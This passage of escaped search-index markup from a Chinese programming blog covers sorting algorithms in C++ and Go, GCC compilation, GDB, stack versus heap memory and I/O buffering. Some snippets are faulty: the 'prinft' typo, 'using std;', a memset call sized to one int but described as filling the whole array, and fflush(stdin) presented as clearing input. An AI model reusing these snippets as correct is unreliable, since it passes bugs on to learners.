&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void bubSort(int *arr,int n)
{
    for(int i=0;i&amp;lt;n;i++)
        for(int j=0;j&amp;lt;n-i-1;j++)
            if(arr[j]&amp;gt;arr[j+1])
                swap(arr[j],arr[j+1]);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3二路归并排序&#34;&gt;3.二路归并排序&lt;/h3&gt;
&lt;p&gt;按照分治思想，将序列分为若干子序列，子序列有序，然后再将子序列合并为整体有序序列。&lt;/p&gt;
&lt;p&gt;大概的步骤是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定分界点&lt;code&gt;mid = (l + r) / 2&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;递归排序左半边&lt;code&gt;left&lt;/code&gt;，右半边&lt;code&gt;right&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;归并，将两个数组合二为一。*(利用到了双指针)&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int tmp[N];

void merge_sort(int *arr, int l, int r)
{
    if(l &amp;gt;= r) return;
    
    int mid = l + (r - l) / 2;
    
    merge_sort(arr, l, mid);
    merge_sort(arr, mid + 1, r);
    
    int k = 0, i = l, j = mid + 1;
    
    while(i &amp;lt;= mid &amp;amp;&amp;amp; j &amp;lt;= r)
        if(arr[i] &amp;lt;= arr[j]) tmp[k++] = arr[i++];
        else tmp[k++] = arr[j++];

    while(i &amp;lt;= mid) tmp[k++] = arr[i++];
    while(j &amp;lt;= r) tmp[k++] = arr[j++];
    
    for(int i = l; i &amp;lt;= r; i++)
        arr[i] = tmp[i - l];
}


&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;4基数排序&#34;&gt;4.基数排序&lt;/h3&gt;
&lt;p&gt;桶子排序，按照基数对整个序列进行多次的排序。&lt;/p&gt;
&lt;h2 id=&#34;不稳定排序&#34;&gt;不稳定排序&lt;/h2&gt;
&lt;h3 id=&#34;5选择排序&#34;&gt;5.选择排序&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void selSort(int *arr,int n)
{
    for(int i=0;i&amp;lt;n;i++)
    {
        int MIN_index = i;
        for(int j=i;j&amp;lt;n;j++)
            if(arr[MIN_index]&amp;gt;arr[j]) MIN_index=j;
        swap(arr[MIN_index],arr[i]);
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;6快速排序&#34;&gt;6.快速排序&lt;/h3&gt;
&lt;p&gt;分治。&lt;/p&gt;
&lt;p&gt;大概分为以下步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定分界点&lt;code&gt;x&lt;/code&gt;：&lt;code&gt;arr[l]&lt;/code&gt; &lt;code&gt;arr[(l+r)/2]&lt;/code&gt; &lt;code&gt;q[r]&lt;/code&gt;都是可以的；&lt;/li&gt;
&lt;li&gt;调整区间，使得&lt;code&gt;x&lt;/code&gt;左边都是小于等于&lt;code&gt;x&lt;/code&gt;，右边都是大于&lt;code&gt;x&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;递归处理左右两端。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;其中第2步是比较重要的，一个简单的实现方法就是额外开两个数组&lt;code&gt;a&lt;/code&gt;和&lt;code&gt;b&lt;/code&gt;，在扫描&lt;code&gt;q&lt;/code&gt;的过程，小于等于&lt;code&gt;x&lt;/code&gt;的数放入&lt;code&gt;a&lt;/code&gt;，大于&lt;code&gt;x&lt;/code&gt;的数放入&lt;code&gt;b&lt;/code&gt;，最后将两个数组合并就可以了。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void quick_sort(int *arr, int l, int r)
{
    if(l &amp;gt;= r) return;
    
    int x = arr[(l + r) / 2], i = l - 1, j = r + 1;
    
    while(i &amp;lt; j)
    {
        do i++; while(arr[i] &amp;lt; x);
        do j--; while(arr[j] &amp;gt; x);
        if(i &amp;lt; j) swap(arr[i], arr[j]);
    }
    
    quick_sort(arr, l, j);
    quick_sort(arr, j + 1, r);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7希尔排序&#34;&gt;7.希尔排序&lt;/h3&gt;
&lt;p&gt;希尔排序就是升级版的插入排序。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void sheSort(int *arr,int n)
{
    int gap=n/2;
    while(gap&amp;gt;=1)
    {
        for(int i=gap; i&amp;lt;n; i++)
        {
            int j=i-gap;
            int tmp=arr[i];
            while(j&amp;gt;=0&amp;amp;&amp;amp;tmp&amp;lt;arr[j])
            {
                arr[j+gap]=arr[j];
                j-=gap;
            }
            arr[j+gap]=tmp;
        }
        gap/=2;
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;8堆排序&#34;&gt;8.堆排序&lt;/h3&gt;
&lt;p&gt;https://www.jianshu.com/p/15a29c0ace73&lt;br&gt;
https://www.cnblogs.com/xingyunshizhe/p/11311754.html&lt;/p&gt;
&lt;p&gt;堆是一种非线性结构，近似完全二叉树的结构，可以用一个数组去存储这个树结构。&lt;br&gt;
每个节点的值大于其左右儿子叫作大顶堆，每个节点的值小于其左右儿子叫作小顶堆。&lt;/p&gt;
&lt;h4 id=&#34;使用堆的原因&#34;&gt;使用堆的原因&lt;/h4&gt;
&lt;p&gt;如果仅仅是需要得到一个有序的序列，使用排序就可以很快完成，并不需要去组织一个新的数据结构。但是如果我们的需求是对于一个随时会有更新的排序，我要随时知道这个排序的最小值或最大值是什么。&lt;/p&gt;
&lt;h4 id=&#34;c的priority_queue&#34;&gt;c++的priority_queue&lt;/h4&gt;
&lt;p&gt;c++的priority_queue的实现机制就是使用了大顶堆或小顶堆。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;
#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;
#include &amp;lt;algorithm&amp;gt;
#include &amp;lt;vector&amp;gt;
#include &amp;lt;map&amp;gt;
#include &amp;lt;unordered_map&amp;gt;
#include &amp;lt;string&amp;gt;
#include &amp;lt;queue&amp;gt;
using namespace std;


/**
默认比较函数为less, 大顶堆
**/
void defaultCmpLess() {
    cout &amp;lt;&amp;lt; &amp;quot;=========defaultCmpLess(big heap)========&amp;quot; &amp;lt;&amp;lt; endl;
    priority_queue&amp;lt;int&amp;gt; q;
    for (int i = 0; i &amp;lt; 10; i++) {
        q.push(rand()%20);
    }

    while (!q.empty()) {
        cout &amp;lt;&amp;lt; q.top() &amp;lt;&amp;lt; &amp;quot; &amp;quot;;
        q.pop();
    }
    cout &amp;lt;&amp;lt;endl;

}

/**
使用greater比较函数，小顶堆
**/
void useCmpGreater() {
    cout &amp;lt;&amp;lt; &amp;quot;=========useCmpGreater(small heap)========&amp;quot; &amp;lt;&amp;lt; endl;
    priority_queue&amp;lt;int, vector&amp;lt;int&amp;gt;, greater&amp;lt;int&amp;gt; &amp;gt; q;
    for (int i = 0; i &amp;lt; 10; i++) {
        q.push(rand()%20);
    }

    while (!q.empty()) {
        cout &amp;lt;&amp;lt; q.top() &amp;lt;&amp;lt; &amp;quot; &amp;quot;;
        q.pop();
    }
    cout &amp;lt;&amp;lt;endl;
}


//==========================

struct Node
{
    int x, y;
    Node(int a = 0, int b = 0):x(a), y(b){};
    friend bool operator&amp;lt;(const Node &amp;amp;a, const Node &amp;amp;b);

};
inline bool operator&amp;lt;(const Node &amp;amp;a, const Node &amp;amp;b) {
    if (a.x != b.x)
        return a.x &amp;lt; b.x;
    return a.y &amp;gt; b.y;
}

/**
运算符重载
**/
void overloadOperator() {
    cout &amp;lt;&amp;lt; &amp;quot;=========overload Operator&amp;lt; =========&amp;quot; &amp;lt;&amp;lt; endl;
    cout &amp;lt;&amp;lt; &amp;quot;a.x &amp;lt; b.x; a.y &amp;gt; b.y&amp;quot; &amp;lt;&amp;lt; endl;
    priority_queue&amp;lt;Node&amp;gt; q;
    for (int i = 0; i &amp;lt; 10; i++) {

        q.push( Node( rand()%20, rand()%20 ) );
    }

    while (!q.empty()) {
        cout &amp;lt;&amp;lt; q.top().x &amp;lt;&amp;lt; &amp;quot;,&amp;quot; &amp;lt;&amp;lt; q.top().y &amp;lt;&amp;lt; endl;
        q.pop();
    } 
    cout &amp;lt;&amp;lt; endl;   
}


//=========================
/**
自构建比较函数
**/
struct cmp2
{
    bool operator()(int a, int b) {
        return a &amp;lt; b;
    }
};

void designCmp() {
    cout &amp;lt;&amp;lt; &amp;quot;=========designCmp========&amp;quot; &amp;lt;&amp;lt; endl;
    cout &amp;lt;&amp;lt; &amp;quot;operator a&amp;lt;b&amp;quot; &amp;lt;&amp;lt; endl;
    priority_queue&amp;lt;int, vector&amp;lt;int&amp;gt;, cmp2 &amp;gt; q;

    for (int i = 0; i &amp;lt; 10; i++) {
        q.push(rand()%20);
    }

    while (!q.empty()) {
        cout &amp;lt;&amp;lt; q.top() &amp;lt;&amp;lt; &amp;quot; &amp;quot;;
        q.pop();
    }
    cout &amp;lt;&amp;lt;endl;
}

int main(int argc, char const *argv[])
{   
    defaultCmpLess();
    useCmpGreater();
    overloadOperator();
    designCmp();
}


/**
=========defaultCmpLess(big heap)========
18 18 13 12 10 9 9 7 4 3
=========useCmpGreater(small heap)========
0 0 2 3 5 7 7 9 12 12
=========overload Operator&amp;lt; =========
a.x &amp;lt; b.x; a.y &amp;gt; b.y
19,1
19,9
19,18
17,6
16,15
12,7
10,13
9,17
3,9
0,13

=========designCmp========
operator a&amp;lt;b
17 16 14 13 12 11 8 7 5 5

**/
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;go实现堆排序&#34;&gt;go实现堆排序&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

// Heap 定义堆排序过程中使用的堆结构
type Heap struct {
    arr  []int   // 用来存储堆的数据
    size int     // 用来标识堆的大小
}

// adjustHeap 用于调整堆，保持堆的固有性质
func adjustHeap(h Heap, parentNode int) {
    leftNode := parentNode*2 + 1
    rightNode := parentNode*2 + 2

    maxNode := parentNode
    if leftNode &amp;lt; h.size &amp;amp;&amp;amp; h.arr[maxNode] &amp;lt; h.arr[leftNode] {
        maxNode = leftNode
    }
    if rightNode &amp;lt; h.size &amp;amp;&amp;amp; h.arr[maxNode] &amp;lt; h.arr[rightNode] {
        maxNode = rightNode
    }

    if maxNode != parentNode {
        h.arr[maxNode], h.arr[parentNode] = h.arr[parentNode], h.arr[maxNode]
        adjustHeap(h, maxNode)
    }
}

// createHeap 用于构造一个堆
func createHeap(arr []int) (h Heap) {
    h.arr = arr
    h.size = len(arr)

    for i := h.size / 2; i &amp;gt;= 0; i-- {
        adjustHeap(h, i)
    }
    return
}

// heapSort 使用堆对数组进行排序
func heapSort(arr []int) {
    h := createHeap(arr)

    for h.size &amp;gt; 0 {
        // 将最大的数值调整到堆的末尾
        h.arr[0], h.arr[h.size-1] = h.arr[h.size-1], h.arr[0]
        // 减少堆的长度
        h.size--
        // 由于堆顶元素改变了，而且堆的大小改变了，需要重新调整堆，维持堆的性质
        adjustHeap(h, 0)
    }
}

func main() {
    // 测试代码
    arr := []int{9, 8, 7, 6, 5, 1, 2, 3, 4, 0}
    fmt.Println(arr)
    heapSort(arr)
    fmt.Println(arr)
}
&lt;/code&gt;&lt;/pre&gt;
">【算法】各种排序算法</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/cmei-yong-de-xiao-zhi-shi/"" data-c="
          &lt;h2 id=&#34;c编译器gcc&#34;&gt;C++编译器GCC&lt;/h2&gt;
&lt;p&gt;C/C++常用的编译器是由GNU开发的GCC(GNU Compiler Collection)编译器。&lt;/p&gt;
&lt;p&gt;通过GCC编译器可以完成预处理、编译、优化、链接，生成可执行二进制代码。&lt;/p&gt;
&lt;p&gt;常用命令：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;gcc test.c -o test
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;编译过程&#34;&gt;编译过程&lt;/h2&gt;
&lt;p&gt;C/C++&lt;strong&gt;预处理&lt;/strong&gt;、&lt;strong&gt;编译&lt;/strong&gt;、&lt;strong&gt;汇编&lt;/strong&gt;、&lt;strong&gt;链接&lt;/strong&gt;共需4个步骤转换为可执行程序。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.c  --(预处理)--&amp;gt;  .i  --(编译)--&amp;gt;  .s  --(汇编)--&amp;gt;  .o --(链接)--&amp;gt;  可执行程序
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;预处理：将宏定义&lt;code&gt;#define&lt;/code&gt;、条件编译指令&lt;code&gt;#ifdef/#ifndef/#endif&lt;/code&gt;、导入&lt;code&gt;#include&lt;/code&gt;等进行替换和导入，删除注释，添加行号、文件标识符，保留&lt;code&gt;#pragma&lt;/code&gt;编译器指令(.i)；&lt;/li&gt;
&lt;li&gt;编译：编译是对代码进行词法语法分析和优化产生汇编代码(.s)；&lt;/li&gt;
&lt;li&gt;汇编：汇编是将汇编指令转换成机器可以识别的二进制机器指令文件(.o)。&lt;/li&gt;
&lt;li&gt;链接：链接就是把编写的目标代码(.o文件)和系统标准启动代码、库代码这三部分合并成一个文件，即可执行文件，分为静态链接和动态链接。静态链接是在编译阶段就把静态库加入到可执行文件中去，这样可执行文件在执行时就不需要在链接库文件，但可执行文件就比较大；动态链接在链接阶段只加入一些描述信息，而程序执行时再把相应动态库加载到内存中去。&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657115499922.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;h2 id=&#34;编译型-解释型语言&#34;&gt;编译型、解释型语言&lt;/h2&gt;
&lt;h3 id=&#34;编译型语言&#34;&gt;编译型语言&lt;/h3&gt;
&lt;p&gt;需要通过编译器将源代码编译成机器码，之后才能执行的语言。一般需经过编译、链接这两个步骤。编译时把源代码编译成机器码，链接时把各个模块的机器码和依赖库串联起来生成可执行文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;优点：&lt;/strong&gt; 编译一次，运行时不需要编译，所以执行效率高，可以脱离语言环境独立运行（因为已经编译成了基于此机器系统的机器指令码）。大部分软件产品都是以目标程序形式发行给用户，不仅便于直接执行，而且又使得他人难以盗用其中的技术。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;缺点：&lt;/strong&gt; 编译之后如果需要修改则需要再次编译，由于编译执行的语言直接跟CPU的指令集打交道，具有很强的指令依赖性和系统依赖性，因此在不同操作系统之间移植会出现问题，需要根据运行的操作系统环境编译不同的可执行文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;代表语言：&lt;/strong&gt; C、C++、Pascal、Object-C&lt;/p&gt;
&lt;h3 id=&#34;解释型语言&#34;&gt;解释型语言&lt;/h3&gt;
&lt;p&gt;解释型语言的程序不需要编译，相比编译型语言省了道工序，解释型语言在运行程序时才逐行进行翻译。（边执行边翻译）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;优点：&lt;/strong&gt; 有良好的平台兼容性，在任何环境中都可以运行，前提是安装了解释器（虚拟机）。灵活，修改代码的时候直接修改就可以，可以快速部署，不用停机维护。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;缺点：&lt;/strong&gt; 每次运行的时候都要解释一遍，因此运行速度会稍慢。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;代表语言：&lt;/strong&gt; JavaScript、Python、Erlang、PHP、Perl、Ruby&lt;/p&gt;
&lt;p&gt;脚本语言是解释型语言。&lt;/p&gt;
&lt;h3 id=&#34;混合型语言&#34;&gt;混合型语言&lt;/h3&gt;
&lt;p&gt;混合型语言在编译的时候不是直接编译成机器码，而是中间码。&lt;br&gt;
例如java将程序翻译成一种中间代码字节码，可以被java解释器解释的独立于平台的代码。通过解释器，每条java字节指令被分析，然后运行在计算机上。只需编译一次，程序运行时解释执行。&lt;/p&gt;
&lt;p&gt;可以把java字节码看作运行在java虚拟机上的机器代码指令。每种java解释器，不管是java 开发工具还是可以运行java小应用程序的web浏览器，都是一种java VM的实例，java VM也可以由硬件实现。&lt;/p&gt;
&lt;p&gt;我们都知道java语言一个非常重要的特点是与平台无关性，而java VM是实现这一特点的关键。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;gdb调试工具&#34;&gt;GDB调试工具&lt;/h2&gt;
&lt;p&gt;使用GDB调试可执行程序，需要在程序编译时使用带&lt;code&gt;-g&lt;/code&gt;的参数。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;gcc -g test.c -o test

# 调试，会出现以下提示
gdb test
GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-120.el7
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;
and &amp;quot;show warranty&amp;quot; for details.
This GDB was configured as &amp;quot;x86_64-redhat-linux-gnu&amp;quot;.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;...
Reading symbols from /root/test...done.
(gdb)
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h2 id=&#34;堆和栈的区别&#34;&gt;堆和栈的区别&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;内存分配&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;一个由C/C++编译的程序占用的内存分为以下几个部分：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;栈区stack：由编译器自动分配释放，存放函数的参数值，局部变量等，其操作方式类似于数据结构中的栈。简单来说就是程序运行而临时占用的区域空间。&lt;/li&gt;
&lt;li&gt;堆区heap：一般由程序员分配释放，若程序员不释放，程序结束时可能由OS回收。与数据结构的堆是两回事。分配方式类似于链表。&lt;/li&gt;
&lt;li&gt;全局区（静态区）static：全局变量和静态变量的存储是放在一起的，初始化的全局变量和静态变量在一块区域，未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。&lt;/li&gt;
&lt;li&gt;文字常量区：常量字符串就是存放在这里。程序结束后由系统释放。&lt;/li&gt;
&lt;li&gt;程序代码区：存放在函数体的二进制代码。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int a = 0; // 全局初始化区
char *p1; // 全局未初始化区    
main()    
{    
    int b; // 栈    
    char s[] = &amp;quot;abc&amp;quot;; // 栈    
    char *p2; // 栈    
    char *p3 = &amp;quot;123456&amp;quot;; // 123456/0在常量区，p3在栈上。    
    static int c = 0; // 全局（静态）初始化区    
    p1 = (char *)malloc(10);    
    p2 = (char *)malloc(20);    
    p3 = new char[10];
    // p1p2p3分配得来得10和20字节的区域就在堆区。    
    strcpy(p1, &amp;quot;123456&amp;quot;); // 123456/0放在常量区，编译器可能会将它与p3所指向的&amp;quot;123456&amp;quot;优化成一个地方.
}  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;堆栈内存模型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. 堆&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;程序运行的时候，操作系统会给它分配一段内存，用来储存程序和运行产生的数据。这段内存有起始地址和结束地址，比如从0x1000到0x8000，起始地址是较小的那个地址，结束地址是较大的那个地址。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769772888.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;程序运行过程中，对于动态的内存占用请求（比如新建对象，或者使用malloc命令），系统就会从预先分配好的那段内存之中，划出一部分给用户，具体规则是从起始地址开始划分（实际上，起始地址会有一段静态数据，这里忽略）。举例来说，用户要求得到10个字节内存，那么从起始地址0x1000开始给他分配，一直分配到地址0x100A，如果再要求得到22个字节，那么就分配到0x1020。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769792971.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;这种因为用户主动请求而划分出来的内存区域，叫做 Heap（堆）。它由起始地址开始，从低位（地址）向高位（地址）增长。Heap 的一个重要特点就是不会自动消失，必须手动释放，或者由垃圾回收机制来回收。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. 栈&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;除了 Heap 以外，其他的内存占用叫做 Stack（栈）。简单说，Stack 是由于函数运行而临时占用的内存区域。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769848639.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int main() {
   int a = 2;
   int b = 3;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，系统开始执行main函数时，会为它在内存里面建立一个帧（frame），所有main的内部变量（比如a和b）都保存在这个帧里面。main函数执行结束后，该帧就会被回收，释放所有的内部变量，不再占用空间。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769897454.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;如果函数内部调用了其他函数，会发生什么情况？&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int main() {
   int a = 2;
   int b = 3;
   return add_a_and_b(a, b);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上面代码中，main函数内部调用了add_a_and_b函数。执行到这一行的时候，系统也会为add_a_and_b新建一个帧，用来储存它的内部变量。也就是说，此时同时存在两个帧：main和add_a_and_b。一般来说，调用栈有多少层，就有多少帧。&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769925681.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;等到add_a_and_b运行结束，它的帧就会被回收，系统会回到函数main刚才中断执行的地方，继续往下执行。通过这种机制，就实现了函数的层层调用，并且每一层都能使用自己的本地变量。&lt;/p&gt;
&lt;p&gt;所有的帧都存放在 Stack，由于帧是一层层叠加的，所以 Stack 叫做栈。生成新的帧，叫做&amp;quot;入栈&amp;quot;，栈的回收叫做&amp;quot;出栈&amp;quot;。每一次函数执行结束，就自动释放一个帧，所有函数执行结束，整个 Stack 就都释放了。&lt;/p&gt;
&lt;p&gt;Stack 是由内存区域的结束地址开始，从高位（地址）向低位（地址）分配。比如，内存区域的结束地址是0x8000，第一帧假定是16字节，那么下一次分配的地址就会从0x7FF0开始；第二帧假定需要64字节，那么地址就会移动到0x7FB0。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;memset&#34;&gt;memset&lt;/h2&gt;
&lt;p&gt;包含在头文件&lt;code&gt;string.h&lt;/code&gt;中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int a[100];
memset(a, 0, sizeof(int));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;memset&lt;/code&gt;是按照一个字节字节进行赋值，如果&lt;code&gt;memset(a, 1, sizeof(int))&lt;/code&gt;，那么数组中每个数都会为&lt;code&gt;16843009 = 00000001000000010000000100000001&lt;/code&gt;。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;namespace和头文件&#34;&gt;namespace和头文件&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;namespace name{
    //variables, functions, classes
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;name&lt;/code&gt;是命名空间的名字，它里面可以包含变量、函数、类、&lt;code&gt;typedef&lt;/code&gt;、&lt;code&gt;#define&lt;/code&gt; 等，最后由&lt;code&gt;{ }&lt;/code&gt;包围。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;::&lt;/code&gt;是一个新符号，称为域解析操作符，在C++中用来指明要使用的命名空间。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;using Li::fp;
using std;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;stdio.h、stdlib.h、string.h &lt;/code&gt;等都是C语言的头文件，C++以开始也在用，后来 C++ 引入了命名空间的概念，计划重新编写库，将类、函数、宏等都统一纳入一个命名空间，这个命名空间的名字就是std。&lt;code&gt;std&lt;/code&gt; 是 &lt;code&gt;standard&lt;/code&gt; 的缩写，意思是“标准命名空间”。&lt;/p&gt;
&lt;p&gt;后来C++开发了一些新的库，例如&lt;code&gt;iostream&lt;/code&gt;，去掉了&lt;code&gt;.h&lt;/code&gt;，对C语言中的库文件改写成&lt;code&gt;stdio.h&lt;/code&gt;-&amp;gt;&lt;code&gt;cstdio&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;C++在&lt;code&gt;include&lt;/code&gt;和使用非&lt;code&gt;.h&lt;/code&gt;头文件中的函数变量时，必须指定&lt;code&gt;namespace&lt;/code&gt;，因为这些头文件中可能不止一个&lt;code&gt;namespace&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;缓冲区问题&#34;&gt;缓冲区问题&lt;/h2&gt;
&lt;p&gt;输入输出不直接将信息放到指定地点，而是放到缓冲区，刷新缓冲区时才将这些信息输入、输出到指定位置。&lt;/p&gt;
&lt;p&gt;缓冲区是内存空间的一部分，在内存中预留了一定的空间，用来暂存输入输出等I/O操作的一些数据，这些预留的空间就是缓冲区。&lt;/p&gt;
&lt;p&gt;对于C/C++而言，&lt;code&gt;cin&lt;/code&gt;，&lt;code&gt;scanf&lt;/code&gt;，&lt;code&gt;getchar&lt;/code&gt;等输入函数读取数据时，并不会直接从键盘上读取，而是从输入缓冲区中读取，即遵循一个过程：&lt;code&gt;cin &amp;lt;- 输入缓冲区 &amp;lt;- 键盘&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;同样的的&lt;code&gt;cout&lt;/code&gt;，&lt;code&gt;printf&lt;/code&gt;，&lt;code&gt;putchar&lt;/code&gt;等输出函数在输出数据时，不会直接输出到屏幕中，而是先放入输出缓冲区，然后再输出到显示设备。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;缓冲区的作用：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;减少CPU对I/O设备的读写次数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;缓冲区的类型：&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;全缓冲：只有在缓冲区被填满之后才会进行I/O操作；最典型的全缓冲就是对磁盘文件的读写；&lt;/li&gt;
&lt;li&gt;行缓冲；只有在输入或者是输出中遇到换行符的时候才会进行I/O操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做I/O操作。一般来说，标准输入流(&lt;code&gt;stdin&lt;/code&gt;)和标准输出流(&lt;code&gt;stdout&lt;/code&gt;)是行缓冲。&lt;/li&gt;
&lt;li&gt;无缓冲；标准I/O不缓存字符；其中表现最明显的就是标准错误输出流(&lt;code&gt;stderr&lt;/code&gt;)，这使得出错信息尽快的返回给用户。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;缓冲区操作函数(C语言)：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标准输出函数：&lt;code&gt;printf&lt;/code&gt;、&lt;code&gt;puts&lt;/code&gt;、&lt;code&gt;putchar&lt;/code&gt;等。&lt;/li&gt;
&lt;li&gt;标准输入函数：&lt;code&gt;scanf&lt;/code&gt;、&lt;code&gt;gets&lt;/code&gt;、&lt;code&gt;getchar&lt;/code&gt;等。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IO_FILE&lt;/code&gt;：&lt;code&gt;fopen&lt;/code&gt;、&lt;code&gt;fwrite&lt;/code&gt;、&lt;code&gt;fread&lt;/code&gt;、&lt;code&gt;fseek&lt;/code&gt;等&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;fflush&lt;/code&gt;函数的作用是清除缓冲区中的内容：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    int a, b;
    scanf(&amp;quot;%d&amp;quot;, &amp;amp;a);
    b = getchar();
    prinft(&amp;quot;%d %p&amp;quot;, a, b);
    return 0;
}
// 123↓
// 123 0xa

#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
int main()
{
    int a, b;
    scanf(&amp;quot;%d&amp;quot;, &amp;amp;a);
    fflush(stdin); // 清除标准输入流缓冲区
    b = getchar();
    prinft(&amp;quot;%d %p&amp;quot;, a, b);
    return 0;
}
// 123↓c↓
// 123 0x63

&lt;/code&gt;&lt;/pre&gt;
